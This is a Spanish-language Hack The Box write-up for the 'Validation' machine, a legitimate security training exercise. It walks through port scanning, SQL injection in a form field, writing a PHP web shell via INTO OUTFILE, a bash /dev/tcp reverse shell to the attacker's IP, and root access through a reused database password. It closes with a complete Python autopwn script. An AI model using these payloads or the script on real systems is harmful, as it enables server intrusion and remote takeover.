---
title: Validation HTB Write-up
categories: [Write up, Hack The Box]
tags: [Enumeration, SQLi, Web, Scripting, Autopwn, Linux, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/Validation/Validation_banner.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **Hack The Box** llamada **Validation**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*   **Enumeración del sistema.**
*   **Uso de Burpsuite.**
*   **SQL Injection.**
*   **Utilización de SQL Injection para ganar acceso al sistema.**
*   **Automatización de la intrusión en python.**

## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.11.116
PING 10.10.11.116 (10.10.11.116) 56(84) bytes of data.
64 bytes from 10.10.11.116: icmp_seq=1 ttl=63 time=136 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap`, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro `-sS` el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):

```
sudo nmap -p- -sS -open -min-rate 5000 10.10.11.116 -oG Ports
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4566/tcp open  kwtc
8080/tcp open  http-proxy
```
Observamos un puerto web. Vamos a realizar un escaneo de servicios para identificar versiones:

```
sudo nmap -sCV -p22,80,4566,8080 10.10.11.116
```

Como resultado del escaneo tenemos:

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos la versión de ssh y el servicio web. Vamos a analizar este servicio utilizando en primer lugar la herramienta `whatweb`:

```
whatweb 10.10.11.116

http://10.10.11.116 [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.48 (Debian)], IP[10.10.11.116], JQuery, PHP[7.4.23], Script, X-Powered-By[PHP/7.4.23]
```
Tenemos algunas de las tecnologías utilizadas en esta página, vamos a revisarla:

![](/imagenes/Validation/validationweb.png)

Vemos que tenemos un campo **username**, probaremos con el usuario **test** para ver que ocurre:


![](/imagenes/Validation/validationweb2.png)


## Explotación


Intentaremos probar si es vulnerable a **XSS**:

![](/imagenes/Validation/validationweb3.png)

Al ingresar:


![](/imagenes/Validation/validationweb4.png)

Tenemos que es vulnerable a **XSS**, sin embargo, esto no nos sirve porque esta página no tiene algún tipo de autenticación, no podemos por ejemplo intentar robar cookies de sesión, por lo tanto, intentaremos probar si es vulnerable a **sql injection**:

![](/imagenes/Validation/validationweb5.png)

Al parece no ocurre nada especial al agregar **'**, pero utilizaremos `Burpsuite` para manejar las peticiones de manera más cómoda, cuando interceptamos la petición tenemos lo siguiente:

```
POST / HTTP/1.1
Host: 10.10.11.116
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.10.11.116
Connection: close
Referer: http://10.10.11.116/
Cookie: user=098f6bcd4621d373cade4e832627b4f6
Upgrade-Insecure-Requests: 1

username=test&country=Brazil
```

Vemos que en la petición por **POST** va **username** y **country**, por lo tanto, intentamos agregar una comilla simple al final de brazil para ver que sucede:


![](/imagenes/Validation/validationsqlerror.png)


Se observa un error, esto nos quiere decir que es vulnerable a **SQL Injection**, así que probaremos payloads para ver si podemos enumerar información, por ejemplo. intentaremos utilizar union en la data:

```
username=test&country=Brazil' union select 'testing'-- -
```
En la respuesta en **raw** observamos que está testing:

```
<li class='text-white'>testing</li>
```

Por lo tanto, intentaremos enumerar la base de datos:

```
username=test&country=Brazil' union select database()-- -
```
```
<li class='text-white'>registration</li>
```

Observamos que la database tiene como nombre **registration**, podemos intentar enumerar la versión:


```
username=test&country=Brazil' union select version()-- -
```

```
<li class='text-white'>10.5.11-MariaDB-1</li>
```

También podemos enumerar las otras bases de datos dentro del sistema:

```
username=test&country=Brazil' union select schema_name from information_schema.schemata-- -
```
```
<li class='text-white'>information_schema</li><li class='text-white'>performance_schema</li><li class='text-white'>mysql</li><li class='text-white'>registration</li>
```

Podemos ver las diferentes bases de datos del sistema, en este punto podríamos probar si tenemos capacidad de escritura utilizando **into outfile** dentro de /var/www/html, pues el servidor está corriendo allí según el error:

```
username=test&country=Brazil' union select "testing" into outfile "/var/www/html/testing.txt"-- -
```

Vamos entonces hacia el navegador para ver si ha creado el recurso:

![](/imagenes/Validation/validationweb6.png)

Observamos que si se creó. Por lo tanto, tenemos una vía potencial de ganar acceso a la máquina, esto lo realizaremos intentando subir un archivo malicioso para poder entablar una conexión hacia nuestra máquina desde el servidor, en primer lugar vamos a crear el siguiente payload:

```
username=test&country=Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/evil.php"-- -
```
Al ingresar al recursos creado tenemos:

![](/imagenes/Validation/validationweb7.png)

Por lo tanto, ahora solo basta con asignarle un valor a la variable **cmd** para ejecutar comandos:

![](/imagenes/Validation/validationweb8.png)

El siguiente paso es entablar una conexión reversa con nuestra máquina, en este caso usaremos lo siguiente:

```
bash -c 'bash -i >%26 /dev/tcp/10.10.14.17/1234 0>%261'
```

Cabe destacar que corresponde a una variación de las reverse shell de [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), debido a hay que aplicar url encode a los caracteres especiales para que los pueda interpretar, entonces:

```
http://10.10.11.116/evil.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.17/1234 0>261'
```


Luego de ejecutar la instrucción, ya teniamos `netcat` previamente escuchando por el puerto 1234:

```
sudo nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.116] 37056
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ whoami
whoami
www-data
```

Podemos observar que hemos ingresado correctamente a la máquina.

```
www-data@validation:/var/www/html$ ls
ls
account.php  config.php  css  index.php  js
```

Ahora buscaremos la flag de usuario:
```
www-data@validation:/home/htb# cat user.txt
cat user.txt
97661213f37a875cc5951
```

¡Bien! tenemos la flag.

## Escalada de privilegios


En primer lugar, inspeccionaremos estos archivos por si hay información:

```
www-data@validation:/var/www/html$ cat config.php
cat config.php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```
Observamos un usuario y una contraseña. Sin embargo, el usuario no existe:
```
www-data@validation:/var/www/html$ id uhc
id uhc
id: 'uhc': no such user
```

Pero como tenemos la contraseña, si tenemos suerte podría ser la de administrador:
```
www-data@validation:/var/www/html$ su root
su root
Password: uhc-9qual-global-pw

root@validation:/var/www/html# whoami
whoami
root
root@validation:/var/www/html# 
```
Como la contraseña resultó ser la de root, nos hemos convertido en admin, ahora buscaremos la flag de root:
```
root@validation:~# cat root.txt
cat root.txt
f9f6320d7a1fc7f4d4a0
```

Hemos vulnerado completamente la máquina hasta ser administradores.

Sin embargo, como la escalada ha sido bastante lamentable, haremos un script en python para automatizar la intrusión:

En primer lugar, utilizaremos la libreria **requests** y **pwn** para realizar las conexiones, empezaremos definiendo las IP:

```python
target = 'http://10.10.11.116'
target2 = 'http://10.10.11.116/evil.php'
ip = '10.10.14.17' # cambiar esto
session = requests.session()
```

Luego, después de definir las variables globales haremos una función llamada **sqli**, la cual hará la creación del archivo malicioso en el servidor web:

```python
def sqli():

    payload=  """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/evil.php"-- -"""
    
    post_data =  {
        'username':'test',
        'country':payload
    
    }

    session.post(target,data=post_data)
```

Luego, creamos la función que entablará la conexión reversa a nuestra máquina:

```python
def reverse():

    payload ="bash -c 'bash -i >& /dev/tcp/%s/1234 0>&1'" %ip

    post_data={

        'cmd':payload

    }

    session.post(target2,data=post_data)
```
Finalmente, tenemos el main, en el cual llamaremos a estas dos funciones:

```python
if __name__ == '__main__':
    sqli()
    threading.Thread(target=reverse, args=()).start()
    shell = listen(1234,timeout=10).wait_for_connection()
    shell.interactive()
```
En primer lugar, llamamos a la función **sqli** para que suba el archivo malicioso a la web. En segundo lugar, trabajamos con hilos para que la función reverse se ejecute correctamente mientras estamos esperando una conexión por el puerto 1234 para luego tener una consola interactiva.

Con todo lo anterior, basta con cambiar la IP dependiendo de cual tengas y al ejecutar el código tendras una reverse shell para el usuario **www-data**.

El código completo es:

```python
import requests
from pwn import *


target = 'http://10.10.11.116'
target2 = 'http://10.10.11.116/evil.php'
ip = '10.10.14.17' # cambiar esto
session = requests.session()

def sqli():

    payload=  """Brazil' union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/evil.php"-- -"""
    
    post_data =  {
        'username':'test',
        'country':payload
    
    }

    session.post(target,data=post_data)


def reverse():

    payload ="bash -c 'bash -i >& /dev/tcp/%s/1234 0>&1'" %ip

    post_data={

        'cmd':payload

    }

    session.post(target2,data=post_data)

if __name__ == '__main__':
    sqli()
    threading.Thread(target=reverse, args=()).start()
    shell = listen(1234,timeout=10).wait_for_connection()
    shell.interactive()

```

!Listo! 

Hemos realizado la automatización de la intrusión.

Nos vemos, hasta la próxima.

